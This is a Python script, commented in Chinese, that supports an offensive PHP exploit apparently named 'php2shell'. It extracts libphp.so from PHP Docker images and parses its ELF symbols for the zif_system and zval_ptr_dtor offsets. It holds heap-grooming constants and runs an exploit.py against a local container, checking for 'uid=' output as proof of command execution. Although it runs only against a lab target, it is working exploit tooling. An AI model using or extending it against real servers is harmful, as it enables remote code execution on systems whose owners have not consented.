#!/usr/bin/env python3
"""标定表采集器 —— 在 lab 主机上跑，按镜像 digest 采集
   ① libphp.so 里的 zif_system / zval_ptr_dtor 偏移（二进制决定，确定值）
   ② 跑一遍 exploit.py 验证堆标定常量（运行时决定，只能实测）

用法（lab 主机上）：
    python3 collect.py --verify php:8.5.10-apache php:8.4.25-apache
    python3 collect.py --no-verify php:8.5.12-apache        # 只采符号
    python3 collect.py --verify --json calibrate/run.json ...

实现要点：
- libphp.so 用 `docker run --rm --entrypoint cat` 直接取二进制（不落容器名，
  并发安全；容器名带 pid），由本脚本自带的 ELF 解析器读符号，不依赖 binutils。
- 靶标容器名固定 php2shell-target（exploit.py 自动读偏移的默认名），端口 per-run
  递增，跑完即删，不残留。
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.request

ROOT = "/root/php8-exp/php8.5.11"
EXPLOIT = os.path.join(ROOT, "exploit.py")
PHP_INI = os.path.join(ROOT, "docker", "php.ini")
APACHE_CONF = os.path.join(ROOT, "docker", "apache.conf")
WWW = os.path.join(ROOT, "www")
OUT = os.path.join(ROOT, "out")

CONTAINER = "php2shell-target"

# libphp.so 在官方镜像里的候选路径（8.x bookworm / 7.4 buster / alpine）
LIB_PATHS = [
    "/usr/lib/apache2/modules/libphp.so",
    "/usr/lib/apache2/modules/libphp7.so",
    "/usr/local/apache2/modules/libphp.so",
]

# exploit.py 里 bookworm profile 的堆标定（官方 docker 镜像用这一套）
BOOKWORM = {
    "profile": "bookworm",
    "htdata": "0x690d8",
    "stage1_n": 841,
    "stage2_t": 406,
    "stage2_v": 16,
    "stage3_pads": "[(31,31)]*6",
    "sid": "attacksessionid0001",
}

SHT_SYMTAB, SHT_DYNSYM, PT_LOAD = 2, 11, 1


def sh(argv: list[str], timeout: int = 600, binary: bool = False):
    return subprocess.run(argv, capture_output=True, text=not binary, timeout=timeout)


def image_ids(image: str) -> tuple[str, str]:
    r = sh(["docker", "image", "inspect", image, "--format",
            "{{.Id}}|{{if .RepoDigests}}{{index .RepoDigests 0}}{{end}}"])
    if r.returncode != 0:
        raise SystemExit(f"docker image inspect {image} 失败: {r.stderr.strip()}")
    iid, _, dig = r.stdout.strip().partition("|")
    return iid.strip(), dig.strip()


def php_version(image: str) -> str:
    r = sh(["docker", "run", "--rm", "--entrypoint", "php", image, "-r",
            "echo PHP_VERSION;"], timeout=180)
    return r.stdout.strip() or "?"


def parse_elf_symbols(data: bytes, wanted: tuple[str, ...]) -> dict[str, int]:
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise SystemExit("libphp.so 不是 little-endian ELF64")
    e_phoff, = struct.unpack_from("<Q", data, 0x20)
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)

    loads = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, = struct.unpack_from("<I", data, off)
        p_vaddr, = struct.unpack_from("<Q", data, off + 16)
        p_memsz, = struct.unpack_from("<Q", data, off + 40)
        if p_type == PT_LOAD and p_memsz:
            loads.append(p_vaddr)
    if not loads:
        raise SystemExit("没有 PT_LOAD 段")
    bias = min(loads)

    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type = struct.unpack_from("<II", data, off)
        sh_offset, sh_size = struct.unpack_from("<QQ", data, off + 24)
        sh_link, = struct.unpack_from("<I", data, off + 40)
        sh_entsize, = struct.unpack_from("<Q", data, off + 56)
        sections.append({"type": sh_type, "offset": sh_offset, "size": sh_size,
                         "link": sh_link, "entsize": sh_entsize})

    found: dict[str, int] = {}
    for sec in sections:
        if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        if sec["link"] >= len(sections):
            continue
        strtab = sections[sec["link"]]
        entsize = sec["entsize"] or 24
        for i in range(sec["size"] // entsize):
            off = sec["offset"] + i * entsize
            st_name, = struct.unpack_from("<I", data, off)
            st_value, = struct.unpack_from("<Q", data, off + 8)
            if st_name == 0 or st_value == 0:
                continue
            name_off = strtab["offset"] + st_name
            end = data.find(b"\x00", name_off)
            if end < 0:
                continue
            name = data[name_off:end].decode("ascii", "replace")
            if name in wanted and name not in found:
                found[name] = st_value

    missing = [n for n in wanted if n not in found]
    if missing:
        raise SystemExit("libphp.so 里找不到符号: " + ", ".join(missing))
    return {n: found[n] - bias for n in wanted}


def symbols(image: str, attempts: int = 3) -> tuple[dict[str, int], str]:
    """直接 cat 出 libphp.so（不落容器名）→ 解析符号偏移。返回 (偏移, 实际路径)。"""
    last = ""
    for i in range(attempts):
        for path in LIB_PATHS:
            r = sh(["docker", "run", "--rm", "--entrypoint", "cat", image, path],
                   timeout=600, binary=True)
            if r.returncode == 0 and r.stdout[:4] == b"\x7fELF":
                syms = parse_elf_symbols(r.stdout, ("zif_system", "zval_ptr_dtor"))
                return syms, path
            last = (r.stderr or b"").decode("utf-8", "replace").strip()[:200]
        time.sleep(1.0 + i)
    raise SystemExit(f"取不到 libphp.so（{image}）: {last}")


def wait_http(port: int, timeout: float = 60.0) -> bool:
    deadline = time.time() + timeout
    url = f"http://127.0.0.1:{port}/index.php"
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(url, timeout=3) as resp:
                if resp.status == 200:
                    return True
        except (urllib.error.URLError, OSError):
            pass
        time.sleep(1.0)
    return False


def start_target(image: str, port: int):
    sh(["docker", "rm", "-f", CONTAINER])
    return sh([
        "docker", "run", "-d", "--name", CONTAINER,
        "-p", f"127.0.0.1:{port}:80",
        "-v", f"{PHP_INI}:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro",
        "-v", f"{APACHE_CONF}:/etc/apache2/conf-enabled/zz-php2shell.conf:ro",
        "-v", f"{WWW}:/var/www/html:ro",
        "-v", f"{OUT}:/out",
        image,
        "/bin/sh", "-c",
        "chown -R www-data:www-data /out 2>/dev/null || true; exec apache2-foreground",
    ], timeout=300)


def verify(image: str, port: int, zif: int, dtor: int, retries: int = 3) -> dict:
    proof = os.path.join(OUT, "p1")
    if os.path.exists(proof):
        os.unlink(proof)

    r = start_target(image, port)
    if r.returncode != 0:
        return {"ok": False, "error": f"docker run 失败: {r.stderr.strip()}"}
    try:
        if not wait_http(port):
            logs = sh(["docker", "logs", "--tail", "30", CONTAINER])
            return {"ok": False, "error": "target 未就绪: "
                    + (logs.stdout + logs.stderr).strip()[-400:]}
        cmd = [sys.executable, EXPLOIT,
               "-u", f"http://127.0.0.1:{port}/index.php",
               "--zif-offset", hex(zif), "--dtor-offset", hex(dtor),
               "--proof", proof,
               "--retries", str(retries)]
        t0 = time.time()
        run = sh(cmd, timeout=1200)
        blob = (run.stdout or "") + (run.stderr or "")
        got = ""
        if os.path.exists(proof):
            got = open(proof, "rb").read().decode("utf-8", "replace").strip()
        marker = (re.findall(r"(?:HEAP_LEAK_FAILED|LIBPHP_LEAK_FAILED|"
                             r"STAGE3[_A-Z]*FAILED|PROOF:.*)", blob) or [""])[-1]
        return {
            "ok": "uid=" in got,
            "elapsed_s": round(time.time() - t0, 1),
            "proof": got[:200],
            "marker": marker[:200],
            "rc": run.returncode,
        }
    finally:
        sh(["docker", "rm", "-f", CONTAINER])


def collect(image: str, do_verify: bool, port: int, retries: int) -> dict:
    iid, dig = image_ids(image)
    rec: dict = {
        "tag": image,
        "image_id": iid,
        "repo_digest": dig,
        "php_version": php_version(image),
        "collected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "heap": dict(BOOKWORM),
    }
    try:
        syms, libpath = symbols(image)
    except SystemExit as e:
        rec["error"] = str(e)
        return rec
    rec["libphp_path"] = libpath
    rec["zif_system"] = hex(syms["zif_system"])
    rec["zval_ptr_dtor"] = hex(syms["zval_ptr_dtor"])
    rec["delta_dtor_to_zif"] = hex(syms["zif_system"] - syms["zval_ptr_dtor"])
    if do_verify:
        v = verify(image, port, syms["zif_system"], syms["zval_ptr_dtor"], retries)
        rec["verified"] = bool(v.get("ok"))
        rec["run"] = v
    else:
        rec["verified"] = None
    return rec


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("images", nargs="+")
    ap.add_argument("--verify", dest="do_verify", action="store_true")
    ap.add_argument("--no-verify", dest="do_verify", action="store_false")
    ap.set_defaults(do_verify=True)
    ap.add_argument("--port", type=int, default=8099)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--json", default="")
    args = ap.parse_args()

    for p in (EXPLOIT, PHP_INI, APACHE_CONF):
        if not os.path.exists(p):
            raise SystemExit(f"缺少文件: {p}")
    os.makedirs(OUT, exist_ok=True)
    if shutil.which("docker") is None:
        raise SystemExit("找不到 docker")

    out: list[dict] = []
    for idx, image in enumerate(args.images):
        sys.stderr.write(f"\n=== {image} ===\n")
        rec = collect(image, args.do_verify, args.port + idx, args.retries)
        out.append(rec)
        print(json.dumps(rec, ensure_ascii=False), flush=True)

    if args.json:
        os.makedirs(os.path.dirname(os.path.abspath(args.json)) or ".", exist_ok=True)
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(out, f, ensure_ascii=False, indent=2)
        sys.stderr.write(f"\nwrote {args.json}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
